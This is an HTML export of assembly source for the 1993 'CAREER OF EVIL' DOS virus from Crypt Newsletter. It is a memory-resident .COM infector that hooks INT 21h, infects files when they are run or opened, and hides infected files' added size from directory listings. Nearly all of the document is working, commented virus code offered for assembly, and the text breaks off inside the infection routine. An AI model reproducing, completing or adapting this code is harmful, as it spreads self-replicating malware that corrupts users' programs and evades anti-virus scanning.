<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;CAREER OF EVIL virus:  a simple memory resident .COMinfector</span><span class="sc0">
</span><span class="sc1">;which infects on execution and file open.  CAREER OF EVIL also</span><span class="sc0">
</span><span class="sc1">;has limited stealth, subtracting its file size from infected files</span><span class="sc0">
</span><span class="sc1">;by diddling the file control block on "DIR" functions BEFORE the</span><span class="sc0">
</span><span class="sc1">;user sees the result onscreen.  The virus recognizes infected</span><span class="sc0">
</span><span class="sc1">;files by setting a peculiar time-stamp in the unreported seconds</span><span class="sc0">
</span><span class="sc1">;field.  Anti-virus measures are complicated when the virus is</span><span class="sc0">
</span><span class="sc1">;in memory by its ability to infect on file open.  Scanning or</span><span class="sc0">
</span><span class="sc1">;operating any utilities which open files for inspection will</span><span class="sc0">
</span><span class="sc1">;spread the virus to every file examined in this manner.</span><span class="sc0">
</span><span class="sc1">;For best results, assemble CAREER OF EVIL with the A86 assembler.</span><span class="sc0">
</span><span class="sc1">;CAREER OF EVIL: prepared by Urnst Kouch for CRYPT NEWSLETTER 15,</span><span class="sc0">
</span><span class="sc1">;MAY-JUNE 1993.</span><span class="sc0">


       </span><span class="sc5">code</span><span class="sc0">  </span><span class="sc9">segment</span><span class="sc0">
         </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">

         </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0100h</span><span class="sc0">



</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">virus</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Í RottenUK'</span><span class="sc0">   </span><span class="sc1">; dummy place-holder where   </span><span class="sc0">
                   </span><span class="sc1">; virus stashes original 5-bytes</span><span class="sc0">
                   </span><span class="sc1">; from host file</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">             </span><span class="sc12">'Career of Evil'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0FEFDh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ABCDh</span><span class="sc0">    </span><span class="sc1">; put 0ABCDh into ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">; for installation check</span><span class="sc0">
                     </span><span class="sc1">; (also critical in directory stealth)</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">      </span><span class="sc5">failed</span><span class="sc0">      </span><span class="sc1">; if virus is already there,</span><span class="sc0">
                     </span><span class="sc1">; will branch</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                  </span><span class="sc1">; to virus exit when in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; get interrupt vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldint21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; es:bx points to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldint21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">; interrupt handler</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">pargrph</span><span class="sc0">   </span><span class="sc1">; virus size in paragraphs to allot--&gt;cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; an off hand way of doing things</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">; start copying virus into memory</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newint21</span><span class="sc0">  </span><span class="sc1">; set int 21 route through virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">failed</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; exit to host</span><span class="sc0">

</span><span class="sc5">newint21</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">    </span><span class="sc1">; any "dir" user access of file control</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">stealth_entry</span><span class="sc0">   </span><span class="sc1">; block must come through virus</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">    </span><span class="sc1">; next file directory handler</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">stealth_entry</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ABCDh</span><span class="sc0">  </span><span class="sc1">; we need this so that when the virus</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_virus_input</span><span class="sc0"> </span><span class="sc1">; is controlling things, on</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; file infect it doesn't go</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                 </span><span class="sc1">; and subtract another length</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; increment from the directory</span><span class="sc0">
                    </span><span class="sc1">; entries of infected files.</span><span class="sc0">
                    </span><span class="sc1">; although an amusing effect,</span><span class="sc0">
                    </span><span class="sc1">; reducing the filesize of all</span><span class="sc0">
                    </span><span class="sc1">; infected files as reported</span><span class="sc0">
                    </span><span class="sc1">; by DIR one virus length everytime</span><span class="sc0">
                    </span><span class="sc1">; the virus infects ANY file is</span><span class="sc0">
                    </span><span class="sc1">; counter-productive</span><span class="sc0">
</span><span class="sc5">not_virus_input</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">    </span><span class="sc1">; is a program being loaded?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_infect</span><span class="sc0"> </span><span class="sc1">; try to infect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">      </span><span class="sc1">; is a file being opened?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">start_open_infect</span><span class="sc0"> </span><span class="sc1">; if so, get address</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_4B00</span><span class="sc0">    </span><span class="sc1">; exit if not</span><span class="sc0">

</span><span class="sc5">stealth_entry</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">     </span><span class="sc1">; look to virus "stealth"</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">             </span><span class="sc1">; routine</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stealth_begin</span><span class="sc0">

</span><span class="sc5">cycle_dirstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">              </span><span class="sc1">; remove word from the stack</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">              </span><span class="sc1">; and return from interrupt</span><span class="sc0">
                  </span><span class="sc1">; to where we were before pulling</span><span class="sc0">
</span><span class="sc5">stealth_begin</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; stealth trick</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; the following essentially massages the</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; file control block on directory scans,</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; subtracting the virus size from infected</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; files before the user sees it</span><span class="sc0">
                  </span><span class="sc1">; stack setup saves everything</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">    </span><span class="sc1">; get disk transfer address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">normalize_direntry</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; retrieve seconds data</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">           </span><span class="sc1">; from observed file, if it's</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">           </span><span class="sc1">; 31, the file is infected</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_edit_entry</span><span class="sc0">    </span><span class="sc1">; not 31 - file not infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0">       </span><span class="sc1">; subtract virus length from</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; infected file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_edit_entry</span><span class="sc0">   </span><span class="sc1">; no files? exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">no_edit_entry</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; restore everything as normal</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">start_open_infect</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fileseg</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fileseg</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; save segment:offset of</span><span class="sc0">
                         </span><span class="sc1">; file being opened so it</span><span class="sc0">
                         </span><span class="sc1">; can be infected, too</span><span class="sc0">
</span><span class="sc5">check_infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; push everything onto stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">     </span><span class="sc1">; get file attributes of potential host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">back1</span><span class="sc0">        </span><span class="sc1">; failed? exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_attr</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; put attributes here</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">     </span><span class="sc1">; set new file attributes, read or write</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">        </span><span class="sc1">; do it</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">back1</span><span class="sc0">        </span><span class="sc1">; error? exit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">       </span><span class="sc1">; call infection subroutine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">     </span><span class="sc1">; same as above</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B9h</span><span class="sc0">         </span><span class="sc1">; hand code mov CX,</span><span class="sc0">
</span><span class="sc5">old_attr</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

</span><span class="sc5">back1</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; if the attrib-get fails</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; pop everything off stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc5">not_4B00</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">   </span><span class="sc1">; &lt;--------- return to virus exit to host</span><span class="sc0">

</span><span class="sc5">oldint21</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">oldint21</span><span class="sc0">   </span><span class="sc1">; &lt;--interrupt handler</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">    </span><span class="sc1">; open host file with read/write access</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">okay_open</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; was there an error? exit</span><span class="sc0">

</span><span class="sc5">okay_open</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">   </span><span class="sc1">; get file date and file time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; retrieve seconds data from file one                                        </span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">      </span><span class="sc1">; more time              </span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; if it's 31 (1fh), we get a zero            </span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; and the file is already infected         </span><span class="sc0">
         
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">   </span><span class="sc1">; read first five bytes from potential host</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0"> </span><span class="sc1">; store them here</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; error, exit?</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">; get the five bytes?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">       </span><span class="sc1">; no, so exit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">; check, is this an .EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">             </span><span class="sc1">; yes, so no infection</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">host</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">      </span><span class="sc1">; does it start with a jump?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_host</span><span class="sc0">       </span><span class="sc1">; yes - infect.  Here's a</span><span class="sc0">
                      </span><span class="sc1">; subtle point. MUST look for 0e9h</span><span class="sc0">
                      </span><span class="sc1">; or file is not .EXE, not marked</span><span class="sc0">
                      </span><span class="sc1">; virus time-stamp, infection will</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; result in the virus adding itself</span><span class="sc0">
                      </span><span class="sc1">; to almost anything loaded or</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; opened which is not an .EXE or</span><span class="sc0">
